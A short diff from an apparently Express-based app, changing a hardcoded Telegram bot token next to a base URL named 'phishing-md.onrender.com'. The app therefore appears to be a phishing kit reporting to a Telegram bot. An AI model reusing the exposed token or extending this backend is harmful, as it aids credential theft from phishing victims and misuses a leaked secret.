@@ -8,7 +8,7 @@ app.use(bodyParser.json({ limit: "10mb" }));
 app.use(express.static("public"));
 
 // 🔐 CONFIG (put yours here)
-const TOKEN = "8653888099:AAE7kkVarBwcEdMQ7S1ZlrUoLyy9HP86TT";
+const TOKEN = "8653888099:AAE7kkVarBwcEdMQ7S1ZlrUoLyy9HP86TTU";
 const BASE_URL = "https://phishing-md.onrender.com";
 
 // 🤖 BOT
